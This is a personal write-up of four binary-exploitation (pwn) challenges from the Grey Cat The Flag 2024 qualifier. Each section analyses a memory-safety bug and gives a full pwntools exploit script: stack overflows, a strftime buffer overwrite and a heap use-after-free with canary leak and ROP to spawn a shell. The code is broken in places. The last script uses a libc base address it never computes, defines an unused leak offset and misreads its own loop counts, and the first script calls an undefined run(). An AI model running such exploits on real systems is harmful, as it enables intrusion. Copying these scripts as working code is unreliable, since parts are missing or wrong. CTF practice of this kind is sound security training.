---
title: 'Grey cat the flag 2024 Qualifier - Pwnable writeup'
date: 2024-04-11
tags: 
  - 'CTF'
  - 'PWN'
  - '2024'
description: 'My write-up for Grey cat the flag 2024 Qualifier'
---
---
On this CTF event, I've managed to solve 3 challenges during the event, and 1 challenge right after the events. This is my write-up of all that 4 challenges.
## 1. Babygoods
### Analyse
```
$ checksec babygoods
[*] '/home/aneii/ctf/greycat/babygood/distribution/babygoods'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
This level gives us a binary and a source code. Since this challenge is beginner-friendly, the bug is so so clear. It is `buildpram()` function.
```c
int buildpram() {
    char buf[0x10];
    char size[4];
    int num;

    printf("\nChoose the size of the pram (1-5): ");
    fgets(size,4,stdin);
    size[strcspn(size, "\r\n")] = '\0';
    num = atoi(size);
    if (1 > num || 5 < num) {
        printf("\nInvalid size!\n");
        return 0;
    }

    printf("\nYour pram has been created! Give it a name: ");
    //buffer overflow! user can pop shell directly from here
    gets(buf);
    printf("\nNew pram %s of size %s has been created!\n", buf, size);
    return 0;
}
```
It even gives us the comment to says that there's a bug on that line of code. Since we were also given the `win()` function, this is a simple ret2win payload. There's no canary in this binary.
```c 
int sub_15210123() {
    execve("/bin/sh", 0, 0);
}
```
### Exploit
```python 
from pwn import *
import sys
nc = 'challs.nusgreyhats.org'
p = 32345

if sys.argv[1] == "connect":
    chall = remote(host = nc, port = p)
else:
    chall = run('./babygoods')

chall.sendlineafter(b'name: ', b'aa')
chall.sendlineafter(b'Input: ', b'1')
chall.sendlineafter(b'): ', b'1')
# Saved RIP offset examined in GDB.
chall.sendlineafter(b'a name: ', b'a'*5*8 + p64(0x401236))
chall.interactive()
```
And that's the shell, then we get the flag: ``grey{4s_34sy_4s_t4k1ng_c4ndy_fr4m_4_b4by}``
## Motorala
### Analysis
```
$ checksec chall
[*] '/home/aneii/ctf/greycat/motorola/distribution/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
This level also gives us a binary and a source file, but also a Dockerfile. There's nothing much in the Dockerfile.
And again, the bug is just so clear
```c 
void login() {
        char attempt[0x30];
        int count = 5;

        for (int i = 0; i < 5; i++) {
                memset(attempt, 0, 0x30);
                printf("\e[1;91m%d TRIES LEFT.\n\e[0m", 5-i);
                printf("PIN: ");
                scanf("%s", attempt);
                if (!strcmp(attempt, pin)) {
                        view_message();
                }
        }
        slow_type("\n\e[1;33mAfter five unsuccessful attempts, the phone begins to emit an alarming heat, escalating to a point of no return. In a sudden burst of intensity, it explodes, sealing your fate.\e[0m\n\n");
}
```
The format `%s` read input without any byte limit, so there's another buffer overflow again. We don't need to care about the PIN anymore. And this one also does not have canary.
### Exploit
```python
from pwn import *
import sys
nc = 'challs.nusgreyhats.org'
p = 30211
if sys.argv[1] == 'connect':
    chall = remote(host = nc, port = p)
elif sys.argv[1] == "debug":
    chall = gdb.debug('./chall', 'b *login+130\n c')
else:
    chall = process('./chall')

payload = b'A'*9*8 +  p64(0x40101a)+ p64(0x40138e)
time.sleep(5)
chall.send(payload)
chall.interactive()
```
And we got the flag: `grey{g00d_w4rmup_for_p4rt_2_hehe}`
## Baby fmtstr
### Analyse
This challeng gives us 3 options. 
```c 
char output[0x20];
char command[0x20];
int main(){
    int choice = 0;

    setup();

    strcpy(command, "ls");

    while (1){
        puts("Welcome to international time converter!");
        puts("Menu:");
        puts("1. Print time");
        puts("2. Change language");
        puts("3. Exit");
        printf("> ");

        scanf("%d", &choice);
        getchar();

        if(choice == 1){
            print_time();
        }else if(choice == 2){
            set_locale();
        }else{
            goodbye();
        }
        puts("");
    }
}
```
`print_time()` prompted us to input only with format specifiers, then print out the time using `strftime()` according to the input.
```c 
void print_time(){
    time_t now;
    struct tm *time_struct;
    char input[0x20];
    char buf[0x30];

    time(&now);
    time_struct = localtime(&now);

    printf("The time now is %d.\nEnter format specifier: ", now);
    fgets(input, 0x20, stdin);

    for(int i = 0; i < strlen(input)-1; i++){
        if(i % 2 == 0 && input[i] != '%'){
            puts("Only format specifiers allowed!");
            exit(0);
        }
    }

    strftime(buf, 0x30, input, time_struct);
    // remove newline at the end
    buf[strlen(buf)-1] = '\0';

    memcpy(output, buf, strlen(buf));
    printf("Formatted: %s\n", output);
}
```
`change_locale()` is simple. it changes the locale of current process, so the time will printed out according to the locale.
`exit()` does not really exit, but run some command in the `command[0x20]`.
The bug is in `memcpy` in the `print_time()` challenge. As `output` is 0x20 bytes in size, but `strftime` output the string at most 0x30 bytes, so that's an overflow to the `command`. Using that, we can change the command to `sh` then call exit to execute it.
There's 2 approach on how to write meaningful string into command. First one is find some locale that has some ending byte having 's' and 'h', then write them. The other is using format `%0`, which I figured out that it does not interpret the next format.
![image](https://hackmd.io/_uploads/H15g0jzZC.png)
Now that's an easy write.
### Exploit
I used the second one.
```python 
from pwn import *
import sys

context.log_level = 'debug'
#/bin/sh
#h s / n i b /
nc = 'challs.nusgreyhats.org'
p = 31234
if sys.argv[1] == 'connect':
    chall = remote(host = nc, port = p)
elif sys.argv[1] == "debug":
    chall = gdb.debug('./fmtstr', 'b *print_time+255\n c')
else:
    chall = process('./fmtstr')


def hehe(payload):
    chall.sendlineafter(b'> ', b'1')
    time.sleep(0.1)
    chall.sendlineafter(b': ', payload)

libc = ELF('./libc.so.6')
chall.sendlineafter(b'> ', b'2')
chall.sendlineafter(b': ', b'/bin/sh')
hehe(b'%s%s%s%u%u%0%h')
hehe(b'%s%s%s%u%0%s')

chall.interactive()
```
And we got the shell, then cat the flag: `grey{17'5_b0f_71m3}`
## Slingring factory
This is the level that I did not solve in the time of event, but it's worth writing the write-up. 
### Analysing
```
$ checksec ./slingring_factory
[*] '/home/aneii/ctf/greycat/slingring/distribution/slingring_factory'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
That's full armor.
```c 
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[6]; // [rsp+2h] [rbp-Eh] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setup();
  puts("What is your name?");
  fgets(s, 6, stdin);
  printf("Hello, ");
  printf(s);
  putchar(10);
  fflush(stdin);
  menu();
}
```
Before giving us some option, it asks for an input that was later to be a format string bug. This is handy later on.
```

Welcome to my secret sling ring factory.
What do you want to do today?

1. Show Forged Rings
2. Forge Sling Ring
3. Discard Sling Ring
4. Use Sling Ring
>>
```
Then it gives us 4 option. I'll explain option 4 first.
```c 
int use_slingring()
{
  char s[4]; // [rsp+Ch] [rbp-44h] BYREF
  char v2[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Which ring would you like to use (id): ");
  fgets(s, 4, stdin);
  fflush(stdin);
  atoi(s);
  printf("\nPlease enter the spell: ");
  fgets(v2, 256, stdin);
  puts("\nThank you for visiting our factory! We will now transport you.");
  return puts("\nTransporting...");
}
```
There's an overflow bug inside the function. We can write our ROP payload in there. But, first, we need to leak 2 things: base address of libc and canary.
#### Leaking canary
I'm using format string bug to leak the canary. Using GDB, I can find the offset of canary from top of the stack, then leak it using format string bug.
#### Leaking libc
The other three options that I haven't talked about was use to leak libc. In short, they are just malloc, free and puts. The chunk size is 0x90 bytes.
Remember that the tcache was only able to store at most 7 freed chunks of the same size. Other free chunks, if more than 8, will either go to fastbin or unsorted bin. If the size is small enough (less than 0x80) for it to go in the fastbin, then fastbin. Otherwise, it goes into unsorted bin. In this case, the chunk can go into unsorted bin. Free chunks inside the unsorted bin store `bk` pointer, that point back to the libc. And there's a bug inside the free option.
```c 
unsigned __int64 forge_slingring()
{
  unsigned int v1; // [rsp+8h] [rbp-118h]
  int v2; // [rsp+Ch] [rbp-114h]
  char s[128]; // [rsp+10h] [rbp-110h] BYREF
  char v4; // [rsp+90h] [rbp-90h]
  unsigned __int64 v5; // [rsp+118h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("Welcome to the ring forge!");
  puts("Which slot do you want to store it in? (0-9)\nThis will override any existing rings!");
  fgets(s, 4, stdin);
  v1 = atoi(s);
  fflush(stdin);
  if ( v1 >= 0xA )
    goto LABEL_2;
  puts("Enter destination location:");
  fgets(s, 128, stdin);
  v4 = s[0];
  fflush(stdin);
  puts("Enter amount of rings you want to forge (1-9):");
  fgets(s, 4, stdin);
  v2 = atoi(s);
  fflush(stdin);
  if ( v2 > 9 )
    goto LABEL_2;
  if ( v2 > 0 )
  {
    rings[v1] = malloc(0x84uLL);
    *((_DWORD *)rings[v1] + 32) = v2;
    *(_BYTE *)rings[v1] = v4;
    announcement();
    puts("New ring forged!");
    printf(
      "%d rings going to location [%s] forged and placed in slot %d.\n",
      *((unsigned int *)rings[v1] + 32),
      (const char *)rings[v1],
      v1);
    cls();
    puts("Press ENTER to return.");
    getchar();
  }
  else
  {
LABEL_2:
    errorcl();
    puts("Invalid amount!");
    puts("Press ENTER to go back...");
    getchar();
  }
  return v5 - __readfsqword(0x28u);
}
```
It does not clear the freed pointer. We can use read option to read whatever is inside the chunks, including freed chunks.
#### ROP
Having got the libc base and the canary, the rest is easy. I used gadget inside libc to call `system("/bin/sh")`, and that's the shell.
### Exploit
```python 
from pwn import *
import sys

libc = ELF('./libc.so.6')
if sys.argv[1] == "connect":
    chall = remote('challs.nusgreyhats.org', 35678)
elif sys.argv[1] == "debug":
    chall = gdb.debug('./slingring_factory', 'b *use_slingring+140\n c')
else:
    chall = process('./slingring_factory')

# Defining some functions for easier exploit
def malloc(idx):
    chall.sendlineafter(b'>> ', b'2')
    chall.sendlineafter(b'!\n', idx)
    chall.sendlineafter(b':\n', b'aaaaa')
    chall.sendlineafter(b'9):\n',b'9')
    chall.sendafter(b'.\n', b'\n')
def free(idx):
    chall.sendlineafter(b'>> ', b'3')
    chall.sendlineafter(b'?', idx)

# Leaking canary
chall.sendafter(b'?\n', b'%27$p')
chall.recvuntil(b'Hello, 0x')
canary = int(chall.recvline(),16)
log.info("Canary: "+hex(canary))
time.sleep(0.2)
# Malloc 8 chunks
for i in range(0,8):
    malloc(str(i).encode())
# Free 9 chunks
for i in range(8,-1,-1):
    free(str(i).encode())
# Leak libc address
chall.sendlineafter(b'>> ', b'1')
chall.recvuntil(b'Ring Slot #0  | [9]   |')
leak_offset = 0x21ace0
ret = 0x29139
pop_rdi = 0x2a3e5
chall.send(b'\n')
# Use option for to input our ROP payload
chall.sendlineafter(b'>> ', b'4')
chall.sendlineafter(b'): ', b'42')
payload = b'a'*8*7+p64(canary) + p64(0) + p64(base_libc + pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')) + base_libc) + p64(base_libc + ret) + p64(base_libc + libc.sym["system"])
chall.sendlineafter(b'spell: ', payload )
chall.interactive()
```
And that's the shell.
![image](https://hackmd.io/_uploads/HyHFLnGW0.png)
Flag: `grey{y0u_4r3_50rc3r3r_supr3m3_m45t3r_0f_th3_myst1c_4rts_mBRt!y4vz5ea@uq}`
